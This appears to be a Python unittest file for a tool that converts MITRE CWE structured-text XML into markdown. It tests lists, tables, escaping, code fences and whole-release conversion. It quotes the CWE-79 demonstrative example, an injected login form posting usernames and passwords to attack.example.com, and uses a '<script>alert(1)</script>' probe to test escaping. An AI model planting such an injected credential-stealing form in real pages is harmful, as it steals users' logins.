"""Tests for cwe_structured_text (MITRE CWE structured text -> markdown)."""

import sys
import unittest
import zipfile
from pathlib import Path
from xml.etree import ElementTree as ET

SCRIPTS_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SCRIPTS_DIR))

import cwe_structured_text as st  # noqa: E402

CWE_DIR = SCRIPTS_DIR.parent
ZIP_419 = CWE_DIR / "4.19.1" / "cwec_v4.19.1.xml.zip"
ZIP_50 = CWE_DIR / "5.0" / "cwec_v5.0.xml.zip"
XH = "http://www.w3.org/1999/xhtml"


def parse(xml: str) -> ET.Element:
    return ET.fromstring(
        f'<Extended_Description xmlns:xhtml="{XH}">{xml}</Extended_Description>'
    )


def local(tag: str) -> str:
    return tag.rsplit("}", 1)[-1]


def load_zip(path: Path) -> ET.Element:
    with zipfile.ZipFile(path) as z:
        names = [n for n in z.namelist() if n.endswith(".xml")]
        assert len(names) == 1, names
        return ET.fromstring(z.read(names[0]))


class StructuredTextUnit(unittest.TestCase):
    def test_paragraphs_and_lists_keep_order(self):
        e = parse(
            "Lead text."
            "<xhtml:p>First para.</xhtml:p>"
            "<xhtml:ul><xhtml:li>one</xhtml:li><xhtml:li>two</xhtml:li></xhtml:ul>"
            "<xhtml:p>Last para.</xhtml:p>"
        )
        self.assertEqual(
            st.structured_text_to_md(e, "T/x"),
            "Lead text.\n\nFirst para.\n\n- one\n- two\n\nLast para.",
        )

    def test_inline_order_and_markers(self):
        e = parse(
            "<xhtml:p>a <xhtml:b>bold</xhtml:b> b <xhtml:i>it </xhtml:i>c"
            "<xhtml:sup>2</xhtml:sup>\n   tail</xhtml:p>"
        )
        self.assertEqual(
            st.structured_text_to_md(e, "T/x"), "a **bold** b *it* c<sup>2</sup> tail"
        )

    def test_ordered_and_nested_lists(self):
        e = parse(
            "<xhtml:ol><xhtml:li>one<xhtml:ul><xhtml:li>sub</xhtml:li></xhtml:ul>"
            "</xhtml:li><xhtml:li>two</xhtml:li></xhtml:ol>"
        )
        self.assertEqual(
            st.structured_text_to_md(e, "T/x"), "1. one\n   - sub\n2. two"
        )

    def test_br_and_img(self):
        e = parse(
            'x<xhtml:br/>y<xhtml:img src="/data/images/a.png" alt="Alt"/>'
        )
        out = st.structured_text_to_md(e, "T/x")
        self.assertEqual(
            out, "x  \ny![Alt](https://cwe.mitre.org/data/images/a.png)"
        )

    def test_table_converts(self):
        e = parse(
            "<xhtml:table><xhtml:tr><xhtml:th>Reg</xhtml:th><xhtml:th>Desc</xhtml:th>"
            "</xhtml:tr><xhtml:tr><xhtml:td>A|B</xhtml:td><xhtml:td>x<xhtml:br/>y"
            "</xhtml:td></xhtml:tr></xhtml:table>"
        )
        self.assertEqual(
            st.structured_text_to_md(e, "T/x"),
            "| Reg | Desc |\n| --- | --- |\n| A\\|B | x<br>y |",
        )

    def test_escaping(self):
        out = st.escape_inline("<script>alert(1)</script>")
        self.assertNotIn("<", out)
        self.assertFalse(st.escape_inline("# not a heading").startswith("#"))
        self.assertFalse(st.escape_inline("> quote").startswith(">"))
        self.assertTrue(st.escape_inline("- item").startswith("\\-"))
        self.assertTrue(st.escape_inline("1. item").startswith("1\\."))
        self.assertEqual(st.escape_inline("a - b # c > d * e"), "a - b # c > d * e")
        self.assertEqual(st.escape_inline("AT&T and &amp; x"), "AT&T and &amp;amp; x")
        cell = st.escape_table_cell("a|b\nc")
        self.assertNotIn("\n", cell)
        self.assertNotRegex(cell, r"(?<!\\)\|")

    def test_prose_text_is_escaped_in_output(self):
        e = parse("<xhtml:p># heading &lt;b&gt; tag</xhtml:p>")
        out = st.structured_text_to_md(e, "T/x")
        self.assertTrue(out.startswith("\\#"))
        self.assertNotIn("<b", out)

    def test_fence_longer_than_backticks(self):
        out = st.fence("a ``` b\n\tindented", "php")
        first = out.split("\n")[0]
        self.assertGreaterEqual(len(first) - len("php"), 4)
        self.assertTrue(first.startswith("````php"))
        self.assertIn("\n\tindented\n", out)
        self.assertTrue(out.endswith("````"))

    def test_unknown_tag_fails(self):
        e = parse("<xhtml:p>x<xhtml:blink>y</xhtml:blink></xhtml:p>")
        with self.assertRaises(st.UnsupportedMarkupError) as cm:
            st.structured_text_to_md(e, "CWE-79/Extended_Description")
        self.assertIn("CWE-79/Extended_Description", str(cm.exception))
        self.assertIn("blink", str(cm.exception))

    def test_example_code_label_and_fence(self):
        ec = ET.fromstring(
            f'<Example_Code xmlns:xhtml="{XH}" Nature="Bad" Language="PHP">'
            "\n   $x = 1;\n   if ($x) {\n      y();\n   }\n  </Example_Code>"
        )
        out = st.example_code_to_md(ec, "T/ex")
        self.assertEqual(
            out, "*Example (Bad, PHP):*\n\n```php\n$x = 1;\nif ($x) {\n   y();\n}\n```"
        )
        ec2 = ET.fromstring(
            f'<Example_Code xmlns:xhtml="{XH}" Nature="Attack">'
            "<xhtml:div>a &lt;b&gt;<xhtml:br/>c</xhtml:div></Example_Code>"
        )
        self.assertEqual(
            st.example_code_to_md(ec2, "T/ex"),
            "*Example (Attack):*\n\n```\na <b>\nc\n```",
        )

    def test_code_inline_markers_are_plain(self):
        ec = ET.fromstring(
            f'<Example_Code xmlns:xhtml="{XH}" Nature="Bad" Language="C">'
            "<xhtml:div>int <xhtml:b>x</xhtml:b> = <xhtml:i>1</xhtml:i>;</xhtml:div>"
            "</Example_Code>"
        )
        self.assertIn("int x = 1;", st.example_code_to_md(ec, "T/ex"))

    def test_example_code_with_table_is_structured(self):
        ec = ET.fromstring(
            f'<Example_Code xmlns:xhtml="{XH}" Nature="Bad" Language="Other">'
            "<xhtml:table><xhtml:tr><xhtml:th>A</xhtml:th></xhtml:tr>"
            "<xhtml:tr><xhtml:td>1</xhtml:td></xhtml:tr></xhtml:table></Example_Code>"
        )
        out = st.example_code_to_md(ec, "T/ex")
        self.assertTrue(out.startswith("*Example (Bad, Other):*\n\n| A |"))
        self.assertNotIn("```", out)


@unittest.skipUnless(ZIP_419.exists(), "4.19.1 original not present")
class Cwe79(unittest.TestCase):
    def test_cwe79_result_example_order(self):
        root = load_zip(ZIP_419)
        weakness = next(
            e for e in root.iter() if local(e.tag) == "Weakness" and e.get("ID") == "79"
        )
        demo = next(e for e in weakness if local(e.tag) == "Demonstrative_Examples")
        results = [
            e
            for e in demo.iter()
            if local(e.tag) == "Example_Code" and e.get("Nature") == "Result"
        ]
        self.assertTrue(results)
        out = st.example_code_to_md(results[0], "CWE-79/Demonstrative_Examples")
        expected = (
            '<div class="header"> Welcome, <div id="stealPassword"> Please Login:\n'
            '    <form name="input" action="attack.example.com/stealPassword.php" method="post">\n'
            '        Username: <input type="text" name="username" /><br/>\n'
            '        Password: <input type="password" name="password" /><br/>\n'
            '        <input type="submit" value="Login" />\n'
            "    </form>\n"
            "</div></div>"
        )
        self.assertEqual(out, "*Example (Result):*\n\n" + st.fence(expected, ""))
        self.assertIn(expected, out)


def structured_elements(root: ET.Element):
    """Yield (element, is_example_code) for every structured-text element."""
    plain_names = {
        "Extended_Description", "Background_Detail", "Note", "Technical_Nuance",
        "Intro_Text", "Body_Text", "Summary", "Objective", "Comments",
        "Rationale", "Description",
    }
    for e in root.iter():
        if not isinstance(e.tag, str):
            continue
        if e.tag.startswith("{" + XH + "}"):
            continue
        name = local(e.tag)
        has_xhtml = any(
            isinstance(c.tag, str) and c.tag.startswith("{" + XH + "}") for c in e
        )
        if name == "Example_Code":
            yield e, True
        elif has_xhtml or name in plain_names:
            if any(local(c.tag) in ("Example_Code",) for c in e if isinstance(c.tag, str)):
                continue
            yield e, False


class AllRealData(unittest.TestCase):
    def _convert_all(self, path: Path) -> int:
        root = load_zip(path)
        count = 0
        stack = []

        def ctx(e):
            return f"{local(e.tag)}#{count}"

        for e, is_code in structured_elements(root):
            count += 1
            if is_code:
                out = st.example_code_to_md(e, ctx(e))
                self.assertTrue(out.startswith("*Example"))
            else:
                # A structured-text element that nests Example_Code is not one.
                out = st.structured_text_to_md(e, ctx(e))
            self.assertNotIn("\r", out)
        del stack
        return count

    @unittest.skipUnless(ZIP_419.exists(), "4.19.1 original not present")
    def test_all_structured_text_in_4_19_1_converts(self):
        self.assertGreater(self._convert_all(ZIP_419), 1000)

    @unittest.skipUnless(ZIP_50.exists(), "5.0 original not present")
    def test_all_structured_text_in_5_0_converts(self):
        self.assertGreater(self._convert_all(ZIP_50), 1000)

    @unittest.skipUnless(ZIP_50.exists(), "5.0 original not present")
    def test_output_is_deterministic(self):
        root = load_zip(ZIP_50)
        elems = [e for e, c in structured_elements(root) if not c][:200]
        a = [st.structured_text_to_md(e, "x") for e in elems]
        b = [st.structured_text_to_md(e, "x") for e in elems]
        self.assertEqual(a, b)


if __name__ == "__main__":
    unittest.main()
